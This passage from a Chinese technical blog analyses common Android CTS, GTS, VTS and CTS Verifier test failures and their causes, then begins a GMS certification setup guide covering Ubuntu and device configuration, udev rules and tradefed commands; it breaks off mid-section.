class="line">Test:android.devicepolicy.cts.LostModeLocationTest#sendLostModeLocationUpdate_noLocation_returnFalse[IncludeRunOnDeviceOwnerUser]</span><br><span class="line">Details:expected: false</span><br><span class="line"></span><br><span class="line">Module:CtsLocationGnssTestCases</span><br><span class="line">Test:android.location.cts.gnss.GnssLocationRateChangeTest#testVariedRates</span><br><span class="line">Details:junit.framework.AssertionFailedError: Failing tests are: </span><br><span class="line"></span><br><span class="line">Module:CtsLocationGnssTestCases</span><br><span class="line">Test:android.location.cts.gnss.GnssPseudorangeVerificationTest#testPseudoPosition</span><br><span class="line">Details:junit.framework.AssertionFailedError: Time elapsed without getting enough location fixes. Possibly, the test has been run deep indoors. Consider retrying test outdoors.</span><br><span class="line"></span><br><span class="line">Module:CtsLocationPrivilegedTestCases</span><br><span class="line">Test:android.location.cts.privileged.GnssMeasurementRegistrationTest#testGnssMeasurementRegistration_enableCorrelationOutputs</span><br><span class="line">Details:junit.framework.AssertionFailedError: Failing tests are: </span><br><span class="line"></span><br><span class="line">Module:CtsLocationPrivilegedTestCases</span><br><span class="line">Test:android.location.cts.privileged.GnssLocationValuesTest#testLowPowerModeGnssLocation</span><br><span class="line">Details:java.lang.AssertionError: Time elapsed without getting enough regular GNSS locations. Possibly, the test has been run deep indoors. Consider retrying test outdoors.</span><br></pre></td></tr></table></figure><p>定位问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Module:CtsHostsideNetworkTests</span><br><span class="line">Test:com.android.cts.net.HostsideVpnTests#testAppDisallowed</span><br><span class="line">Details:java.lang.AssertionError: on-device tests failed:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.InetAddressTest#test_isReachable_by_ICMP</span><br><span class="line">Details:java.lang.AssertionError</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.OldSocketTest#test_connectLjava_net_SocketAddressI</span><br><span class="line">Details:junit.framework.AssertionFailedError: No interrupted exception when connecting to address nobody listening on with short timeout 200: </span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.OldSocketTest#test_connectLjava_net_SocketAddressI_setSOTimeout</span><br><span class="line">Details:java.lang.NullPointerException: Attempt to invoke virtual method &#x27;void java.lang.Throwable.printStackTrace(java.io.PrintWriter)&#x27; on a null object reference</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.SocketTest#testCloseDuringConnect</span><br><span class="line">Details:java.util.concurrent.ExecutionException: java.lang.AssertionError: connect() to address(/192.0.2.0:80) did not block as required</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.SocketTest#testSocketTestAllAddresses</span><br><span class="line">Details:junit.framework.AssertionFailedError: Expected [ip6-localhost/::1, localhost/127.0.0.1], got [loopback46.unittest.grpc.io/127.0.0.1]</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:org.apache.harmony.tests.java.net.InetAddressTest#test_isReachableLjava_net_NetworkInterfaceII</span><br><span class="line">Details:junit.framework.AssertionFailedError</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.SocketTimeoutTest#testSocketConnectTimeout</span><br><span class="line">Details:java.lang.AssertionError</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.ConcurrentCloseTest#test_connect</span><br><span class="line">Details:junit.framework.AssertionFailedError: connect returned: Socket[address=/192.0.2.0,port=80,localPort=40986]!</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.ConcurrentCloseTest#test_connect_nonBlocking</span><br><span class="line">Details:junit.framework.AssertionFailedError: connect returned: java.nio.channels.SocketChannel[connected local=/192.168.1.133:40994 remote=/192.0.2.0:80]!</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.ConcurrentCloseTest#test_connect_timeout</span><br><span class="line">Details:junit.framework.AssertionFailedError: connect returned: Socket[address=/192.0.2.0,port=80,localPort=41010]!</span><br><span class="line"></span><br><span class="line">Module:CtsMediaCodecTestCases</span><br><span class="line">Test:android.media.codec.cts.MediaCodecCapabilitiesTest#testAvcHigh31</span><br><span class="line">Details:java.lang.AssertionError: Stream did not play successfully after all attempts</span><br><span class="line"></span><br><span class="line">Module:CtsMediaPlayerTestCases</span><br><span class="line">Test:android.media.player.cts.StreamingMediaPlayerTest#testHTTP_MPEG4SP_AAC_Video2</span><br><span class="line">Details:org.junit.runners.model.TestTimedOutException: test timed out after 600000 milliseconds</span><br><span class="line"></span><br><span class="line">Module:CtsNetTestCases</span><br><span class="line">Test:android.net.cts.DnsTest#testDnsWorks</span><br><span class="line">Details:junit.framework.AssertionFailedError: Default network did not provide IPv6 connectivity after 5000ms. Please connect to an IPv6-capable network. lp=&#123;InterfaceName: wlan0 LinkAddresses: [ fe80::6c63:ceff:fef5:54e0/64,192.168.1.193/24 ] DnsAddresses: [ /192.168.1.1 ] Domains: null MTU: 0 ServerAddress: /192.168.1.1 TcpBufferSizes: 1730560,3461120,6922240,524288,1048576,4525824 Routes: [ fe80::/64 -&amp;gt; :: wlan0 mtu 0,192.168.1.0/24 -&amp;gt; 0.0.0.0 wlan0 mtu 0,0.0.0.0/0 -&amp;gt; 192.168.1.1 wlan0 mtu 0 ]&#125;</span><br></pre></td></tr></table></figure><p>网络问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.highmemorytest.java.text.DecimalFormatTest#testCurrencySymbolSpacing[zh_HK_#Hans]</span><br><span class="line">Details:Test did not run due to instrumentation issue. Last executed test was libcore.highmemorytest.java.text.DecimalFormatTest#testCurrencySymbolSpacing[zh].Run level error reported reason: &#x27;Detected device offline causing instrumentation error: Test run failed to complete. Expected 2027 tests, received 685&#x27;</span><br></pre></td></tr></table></figure><p>该问题为将横屏设备竖屏放置并开启了屏幕旋转导致的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:CtsSecurityTestCases</span><br><span class="line">Test:android.security.cts.PackageSignatureTest#testPackageSignatures</span><br><span class="line">Details:Error junit.framework.AssertionFailedError: These packages should not be signed with a well known key: [com.android.RemoteDPC]</span><br></pre></td></tr></table></figure><p>将设备恢复出厂设置再测试即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:art-run-test-048-reflect-v8</span><br><span class="line">Test:ArtRunTest_arm64-v8a#art-run-test-048-reflect-v8</span><br><span class="line">Details:Error in `ArtRunTest` test runner: java.nio.file.NoSuchFileException: /tmp/tf-workfolder10168379172960212953/art-run-test-048-reflect-v89331040322975259920</span><br></pre></td></tr></table></figure><p>临时缓存文件有问题，将整个 &#x2F;tmp目录删除，然后重启设备再测试即可。</p><h2 id="GTS测试结果分析"><a href="#GTS测试结果分析" class="headerlink" title="GTS测试结果分析"></a>GTS测试结果分析</h2><h3 id="常见异常-1"><a href="#常见异常-1" class="headerlink" title="常见异常"></a>常见异常</h3><p>在进行了10轮的GTS测试，还剩20项未通过，此时可以查看结果来分析为什么未通过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:GtsGmscoreHostTestCases</span><br><span class="line">Test:com.google.android.gts.location.locationhost.LocationHostTest#testGnssSatelliteBlocklist</span><br><span class="line">Details:java.lang.AssertionError: on-device tests failed:</span><br></pre></td></tr></table></figure><p>此项未通过和定位有关。需要的室外或者窗户旁边进行测试，不然信号弱就无法通过，但这里不需要继续处理，因为实验室会在合适的环境进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Module:GtsGmscoreHostTestCases</span><br><span class="line">Test:com.google.android.gts.security.AttestationRootHostTest#testEcAttestationChainRemProvLengthTee</span><br><span class="line">Details:com.google.android.gts.security.AttestationRootHostTest#testEcAttestationChainRemProvLengthTee</span><br><span class="line"></span><br><span class="line">Module:GtsGmscoreHostTestCases</span><br><span class="line">Test:com.google.android.gts.security.AttestationRootHostTest#testRsaAttestationChainRemProvLengthTee</span><br><span class="line">Details:java.lang.AssertionError: on-device tests failed:</span><br></pre></td></tr></table></figure><p>这两项和 security 相关，这个需要将设备的安卓内核参数上传给谷歌，也是无需继续测试，将参数发送给实验室即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Module:GtsLocationTestCases</span><br><span class="line">Test:com.google.android.location.gts.gnss.GnssMeasurementValuesTest#testListenForGnssMeasurements</span><br><span class="line">Details:junit.framework.AssertionFailedError: Time elapsed without getting enough location fixes. Possibly, the test has been run deep indoors. Consider retrying test outdoors.</span><br><span class="line"></span><br><span class="line">Module:GtsLocationTestCases</span><br><span class="line">Test:com.google.android.location.gts.gnss.GnssLocationValuesTest#testLocationRegularFields</span><br><span class="line">Details:junit.framework.AssertionFailedError: Failing tests are: </span><br></pre></td></tr></table></figure><p>这两大段全是和 location相关，也是需要到室外空旷地方测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:GtsRegulationComplianceTestCases</span><br><span class="line">Test:com.google.android.regulationcompliance.gts.EEAComplianceTest#testEEAv2Compliance</span><br><span class="line">Details:java.lang.RuntimeException: This build does not meet all of the EEA requirements for EEA devices.</span><br></pre></td></tr></table></figure><p>这个 EEA 的异常，这个是销往欧洲需要的测试，在欧洲本地测试能通过，其他地区无法通过，不需要管。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:GtsSetupWizardHostTestCases </span><br><span class="line">Test:com.google.android.gts.setupwizard.SetupWizardZeroTouchTest#testZeroTouch_zeroTouchWrapperLaunched</span><br><span class="line">Details:java.lang.AssertionError: on-device tests failed:</span><br></pre></td></tr></table></figure><p>最后的 SetupWizardHostTestCases 是谷歌的用户登录的测试，想要通过的话需要初次激活谷歌设备时进行wifi连接，这里可以恢复出厂设置连接后重新测试，会通过。</p><h2 id="VTS测试结果分析"><a href="#VTS测试结果分析" class="headerlink" title="VTS测试结果分析"></a>VTS测试结果分析</h2><h3 id="常见异常-2"><a href="#常见异常-2" class="headerlink" title="常见异常"></a>常见异常</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Module:VtsHalGnssTargetTest</span><br><span class="line">Test:GnssHalTest#TestGnssMeasurementExtensionAndSatellitePvt/0_android_hardware_gnss_IGnss_default</span><br><span class="line">Details:hardware/interfaces/gnss/aidl/vts/gnss_hal_test_cases.cpp:415: Failure</span><br><span class="line"></span><br><span class="line">Module:VtsHalGnssTargetTest</span><br><span class="line">Test:GnssHalTest#BlocklistIndividualSatellites/0_android_hardware_gnss_IGnss_default</span><br><span class="line">Details:No test results.</span><br><span class="line"></span><br><span class="line">Module:VtsHalGnssV1_1TargetTes</span><br><span class="line">Test:PerInstance/GnssHalTest#InjectBestLocation/0_default</span><br><span class="line">Details:No test results.</span><br></pre></td></tr></table></figure><p>定位问题，GNSS (Global Navigation Satellite System) 全球导航卫星系统</p><h2 id="CTS-ON-GSI测试结果分析"><a href="#CTS-ON-GSI测试结果分析" class="headerlink" title="CTS-ON-GSI测试结果分析"></a>CTS-ON-GSI测试结果分析</h2><h3 id="常见异常-3"><a href="#常见异常-3" class="headerlink" title="常见异常"></a>常见异常</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:android.hardware.cts.SensorBatchingTests#testAccelerometer_fastest_batching</span><br><span class="line">Details:junit.framework.AssertionFailedError: VerifySensorOperation | sensor=&#x27;stk83xx_acc&#x27;, samplingPeriod=0us, maxReportLatency=10000000us | Failed due to (insufficient events 384/3200, ), Didn&#x27;t collect any measurements after 2000000000ns</span><br></pre></td></tr></table></figure><p>sensor传感器的问题，换台设备测试或许能过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Module:CtsHostsideNetworkTests</span><br><span class="line">Test:com.android.cts.net.HostsideVpnTests#testAppDisallowed</span><br><span class="line">Details:java.lang.AssertionError: on-device tests failed:</span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.ConcurrentCloseTest#test_connect</span><br><span class="line">Details:junit.framework.AssertionFailedError: connect returned:Socket[address=/192.0.2.0,port=80,localPort=39510]!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:libcore.java.net.OldSocketTest#test_connectLjava_net_SocketAddressI_setSOTimeout</span><br><span class="line">Details:java.lang.NullPointerException: Attempt to invoke virtual method &#x27;void java.lang.Throwable.printStackTrace(java.io.PrintWriter)&#x27; on a null object reference</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Module:CtsLibcoreTestCases</span><br><span class="line">Test:org.apache.harmony.tests.java.net.InetAddressTest#test_isReachableLjava_net_NetworkInterfaceII</span><br><span class="line">Details:junit.framework.AssertionFailedError</span><br></pre></td></tr></table></figure><p>网络问题，里面很多都和cts里面的一样</p><h2 id="CTS-Verifier测试结果分析"><a href="#CTS-Verifier测试结果分析" class="headerlink" title="CTS Verifier测试结果分析"></a>CTS Verifier测试结果分析</h2><h3 id="常见异常-4"><a href="#常见异常-4" class="headerlink" title="常见异常"></a>常见异常</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Notification Listener Test</span><br><span class="line">这一项比较难通过，可以多试几次或者更换设备</span><br><span class="line"></span><br><span class="line">Streaming Video Quality Verifier，不然什么都加载不出来</span><br><span class="line">这一项需要网络特别好</span><br><span class="line"></span><br><span class="line">Network Background Connectivity Test</span><br><span class="line">需要连接支持ipv6的网络</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>GMS测试步骤</title>
    <link href="/2023/11/24/GMS%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4/"/>
    <url>/2023/11/24/GMS%E6%B5%8B%E8%AF%95%E6%AD%A5%E9%AA%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="GMS测试项目"><a href="#GMS测试项目" class="headerlink" title="GMS测试项目"></a>GMS测试项目</h1><h2 id="1、测试环境"><a href="#1、测试环境" class="headerlink" title="1、测试环境"></a>1、测试环境</h2><h3 id="1-1-Ubuntu端配置（示例）"><a href="#1-1-Ubuntu端配置（示例）" class="headerlink" title="1.1 Ubuntu端配置（示例）"></a>1.1 Ubuntu端配置（示例）</h3><ul><li>系统版本：Ubuntu 18.04.6 LTS</li><li>JDK版本： 11.0.20</li><li>SDK中build-tools版本：33.0.2</li><li>ADB版本：1.0.41</li><li>cpu：i5-12400</li><li>内存：16G（这个很重要，在8G的情况下极其容易中断测试）</li><li>硬盘：512G固态</li></ul><p>​</p><p>​除了Ubuntu之外还需要一台 windows 系统的PC，用于烧录固件、SN码还需要装 platform-tools （需要用fastboot：34.0.4）</p><p>​此外需要一个能连接外网的路由，Ubuntu和待测设备均需连接外网。</p><h3 id="1-2-Android端配置"><a href="#1-2-Android端配置" class="headerlink" title="1.2 Android端配置"></a>1.2 Android端配置</h3><ul><li><p>将设备恢复出厂设置：<strong>设置 &gt; 备份和重置 &gt; 恢复出厂数据</strong>。</p></li><li><p>将设备的语言设置为英语（<strong>美国</strong>）：<strong>设置 &gt; 语言和输入法 &gt; 语言</strong>。</p></li><li><p>如果设备上有 GPS 或 Wi-Fi&#x2F;蜂窝网络功能，请打开位置设置：<strong>设置 &gt; 位置 &gt; 开</strong>。</p></li><li><p>将屏幕亮度设置为最低，为了省电</p></li><li><p>打开蓝牙</p></li><li><p>连接到支持 IPv6 的 Wi-Fi 网络，可以将 DUT 视为<em>独立客户端</em>（请参阅上面的<a href="https://source.android.com/docs/compatibility/cts/setup?hl=zh-cn#physical_environment">物理环境</a>），并且具有 Internet 连接：<strong>设置 &gt; Wi-Fi</strong> 。</p></li><li><p>确保设备上未设置锁定图案或密码：<strong>设置 &gt; 安全 &gt; 屏幕锁定 &gt; 无</strong>。</p></li><li><p>将时间设置为 12 小时格式：<strong>设置 &gt; 日期和时间 &gt; 使用 24 小时格式 &gt; 关闭</strong>。</p></li><li><p>在设备上启用<strong>USB 调试</strong>：<strong>设置 &gt; 开发者选项 &gt; USB 调试</strong>。</p></li><li><p>将设备设置为保持唤醒：<strong>设置 &gt; 开发者选项 &gt; 保持唤醒 &gt; 开启</strong>。</p></li><li><p><del>在<strong>Android 4.2 或更高版本</strong>中，关闭 USB 应用程序验证：<strong>设置 &gt; 开发者选项 &gt; 通过 USB 验证应用程序 &gt; 关闭</strong>。</del></p></li><li><p><del>在<strong>Android 13 或更高版本</strong>中，将设备设置为允许模拟调制解调器：<strong>设置 &gt; 开发者选项 &gt; 允许模拟调制解调器 &gt; 开</strong>。</del></p></li><li><p><del><strong>仅在 Android 5.x 和 4.4.x</strong>中，将设备设置为允许模拟位置：<strong>设置 &gt; 开发人员选项 &gt; 允许模拟位置 &gt; 开</strong>。</del></p></li><li><p><del>设置手机连接外网（单测某些模块可不设置）</del></p></li><li><p><del>插入 SIM 卡，打开移动数据 （单测某些模块可不设置）</del></p></li><li><p><del>启动浏览器并关闭任何启动&#x2F;设置屏幕。</del></p></li><li><p><del>如果设备支持自定义默认字体，请将默认<code>sans-serif</code>字体系列设置为<code>Roboto</code> （AOSP 版本中使用的默认<code>sans-serif</code>字体系列）。</del></p></li><li><p>连接待测设备和 PC，在 PC 端执行 <code>adb devices</code>，确保连接成功</p><p>这里在Ubuntu22上是可以直接执行的，但是在Ubuntu18上出现异常：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gms_3.7.10) hu@gms-server-01:~$ adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">6645    no permissions (missing udev rules? user is in the plugdev group); see [http://developer.android.com/tools/device.html]</span><br></pre></td></tr></table></figure><p>这里是因为缺少设备权限或者udev规则配置不正确</p><p>解决方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 加入plugdev组</span><br><span class="line">sudo usermod -aG plugdev $USER</span><br><span class="line"># 配置udev规则</span><br><span class="line">sudo vim /etc/udev/rules.d/51-android.rules</span><br></pre></td></tr></table></figure><p>在51-android.rules中加上，没有的话就新建并写入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSYSTEM==&quot;usb&quot;, ATTR&#123;idVendor&#125;==&quot;0e8d&quot;, ATTR&#123;idProduct&#125;==&quot;201c&quot;,MODE=&quot;0666&quot;, GROUP=&quot;plugdev&quot;</span><br></pre></td></tr></table></figure><p>其中的 idVendor 和 idProduct 是所连接的设备的，可以通过 lsusb查看到。编辑完后然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 重新加载udev规则：</span><br><span class="line">sudo udevadm control --reload-rules</span><br><span class="line"># 重启ADB服务器：</span><br><span class="line">adb kill-server</span><br><span class="line">adb start-server</span><br></pre></td></tr></table></figure><p>然后拔掉usb设备再插上即可</p></li></ul><h2 id="2、测试指令"><a href="#2、测试指令" class="headerlink" title="2、测试指令"></a>2、测试指令</h2><p>CTS、GTS、VTS、GSI、STS测试所执行的指令基本一致，因此放在一起，便于查阅</p><h4 id="启动测试"><a href="#启动测试" class="headerlink" title="启动测试"></a>启动测试</h4><ul><li>手机连接到电脑</li><li>打开 <strong>Ubuntu</strong>，切换到 <strong>需要测试项目对应</strong> 路径</li><li>进入 <strong>测试项目</strong> 控制台： <code>./tools/cts-tradefed</code></li><li>运行 <strong>对应项目</strong> 的测试命令 ： <code>run cts</code>、 <code>run gts</code>、 <code>run vts </code>、 <code>run cts-on-gsi</code>、 <code>run sts-dynamic-incremental</code><ul><li>如果是多台设备，需要携带参数<code>--shard-count number_of_shards</code> （Android9及以上）</li><li>如果是指定设备，需要采用<code>-s deviceID</code> 指定，多个设备需要多次 -s</li><li>重新执行之前失败和未执行的测试指令：<code>run retry -r sessionID</code>，其中的sessionID可以通过指令<code>l r</code>拿到。测试基本都是多轮，一般需要执行到连续3次结果一致，此时再查看结果。在进行的差不多的时候可以将所有设备恢复出厂设置，再继续测。</li><li>在拿到结果后，分析其中产生的原因，再进行单独测试，此时可以使用 <code>--exclude-filter test_module_name</code> 来进行过滤一些费时的测试，将其从运行中排除，例如CTS中的location和network方面测试。具体指令示例:<code>run retry -r 66 --shard-count 6 -s TVE8313M0001 -s TVE8313M0002 -s TVE8313M0003 -s TVE8313M0004 -s TVE8313M0005 -s TVE8313M0006 --exclude-filter CtsHostsideNetworkTests --exclude-filter CtsLibcoreTestCases --exclude-filter CtsMediaCodecTestCases --exclude-filter CtsMediaPlayerTestCases</code></li></ul></li></ul><h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><ul><li>列出所有测试结果： <code>l r</code></li><li>流出所有检测到或已知的设备： <code>l d</code></li><li>查看正在运行的设备状态： <code>l i</code></li><li>查看所运行的指令：<code>l c</code></li><li>单跑某一个模块：<code>run cts -m &lt;模块名&gt;</code></li><li>单跑某个测试项：<code>run cts -m &lt;模块名&gt; -t &lt;测试项名&gt;</code></li><li>单跑某个测试项里具体的一项：<code>run cts -m &lt;模块名&gt; -t &lt;测试项名&gt;#&lt;测试项中的某功能测试项&gt;</code></li><li>复测指令：<code>run retry -r &lt;序列号session&gt;</code></li></ul><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><p>测试的结果文件在 <code>results</code> 目录下，找到对应日期时间的文件夹，该文件夹就是所需要的结果文件，要交付时将这个文件夹打包成压缩包交付。这里面有test_result_failures_suite.html和test_result_html，主要看的是前者，里面全是失败项的详情。</p><p>如果要详细知道某一项为什么不通过，可以进行单测这一项然后查看日志，日志在<code>logs</code>文件夹中。</p><h2 id="3、CTS"><a href="#3、CTS" class="headerlink" title="3、CTS"></a>3、CTS</h2><h3 id="3-1-CTS介绍"><a href="#3-1-CTS介绍" class="headerlink" title="3.1 CTS介绍"></a>3.1 CTS介绍</h3><p>Compatibility Test Suite 意为兼容性测试套件，是 Google 推出的 Android 平台兼容性测试机制。CTS 测试主要是测试 OEM 厂商设计的 Android 平台是不是符合 Android 的 API 接口定义。通过 CTS 测试不仅可以保证 Android 设备上正常运行，同时，也能够让所有的开发者放心地制作高质量的应用程序，因此只有通过 CTS 认证的设备才能合法的安装使用 Google market 等 Google 应用。</p><h3 id="3-2-CTS测试流程"><a href="#3-2-CTS测试流程" class="headerlink" title="3.2 CTS测试流程"></a>3.2 CTS测试流程</h3><h4 id="设置CTS"><a href="#设置CTS" class="headerlink" title="设置CTS"></a>设置CTS</h4><p>（文档：<code>https://source.android.com/docs/compatibility/cts/setup?hl=zh-cn</code>）</p><ul><li><p><code>cd</code>到 android-cts-media 解压后的路径</p></li><li><p>更改文件权限： <code>chmod u+x copy_media.sh</code>  （似乎默认就有权限，可以不用更改）</p></li><li><p>复制必要的文件：</p><ul><li><p>要将剪辑复制到分辨率为 720x480，请运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./copy_media.sh 720x480</span><br></pre></td></tr></table></figure></li><li><p>如果您不确定视频播放最大分辨率，<del>选择最大分辨率 1920x1080</del> 直接运行脚本，不带参数，会全部拷贝进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./copy_media.sh</span><br></pre></td></tr></table></figure></li><li><p>如果 adb 下有多个设备，请将特定设备的串行选项（ <code>-s</code> ）添加到末尾。例如，要将高达 720x480 的分辨率复制到序列号为 1234567 的设备，请运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./copy_media.sh 720x480 -s 1234567</span><br></pre></td></tr></table></figure></li><li><p>当多台设备都需要拷贝时，可以采用 <code>;</code>进行间隔，来依次执行，具体指令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./copy_media.sh -s 1234567;./copy_media.sh -s 1234568;./copy_media.sh -s 1234569</span><br></pre></td></tr></table></figure></li><li><p>除了media之外，还需要复制images，直接运行脚本即可，指定多台设备和上述是一样的方法：</p></li></ul></li></ul><p>​<code>chmod 544 copy_images.sh</code></p><p>​<code>./copy_images.sh</code></p><ul><li><p>在设置完即可<strong>执行指令开始测试</strong></p><p>（CTS 文档：<code>https://source.android.com/docs/compatibility/cts/run?hl=zh-cn</code>）</p></li></ul><p><strong>单独运行CTS媒体测试(此部分转载自官方文档，但实际测试未用到，先不要管下面的内容)</strong></p><p>(文档：<code>https://source.android.com/docs/compatibility/cts/run-locally?hl=zh-cn</code>)</p><ul><li><p>将 android-cts-media-1.5.zip 的下载内容解压缩到 android-cts-media-1.5 文件夹。</p></li><li><p>将 CtsMediaTestCases.zip 媒体文件的下载内容解压缩到 CtsMediaTestCases 文件夹。</p></li><li><p>将CtsMediaTestCases 文件复制到设备的 SD 卡，然后使用以下命令运行模块。</p></li></ul><p>​<code>$adb push CtsMediaTestCases-1.4/ /sdcard/</code></p><ul><li><p>将 android-cts-media-1.5 文件夹移动到宿主机的 &#x2F;tmp&#x2F; 文件夹中。</p><p><code>$adb push android-cts-media-1.5/ /tmp/</code></p></li><li><p>执行 <code>$run cts --module-arg CtsMediaTestCases:config-url:https://storage.googleapis.com/cts_media/DynamicConfig_local.json --module-arg CtsMediaTestCases:local-media-path:/tmp/android-cts-media-1.5 --shard-count 6</code></p></li></ul><h2 id="4、CTS-Verifier"><a href="#4、CTS-Verifier" class="headerlink" title="4、CTS Verifier"></a>4、CTS Verifier</h2><h3 id="4-1-CTS-Verifier介绍"><a href="#4-1-CTS-Verifier介绍" class="headerlink" title="4.1 CTS Verifier介绍"></a>4.1 CTS Verifier介绍</h3><p>CTS Verifier 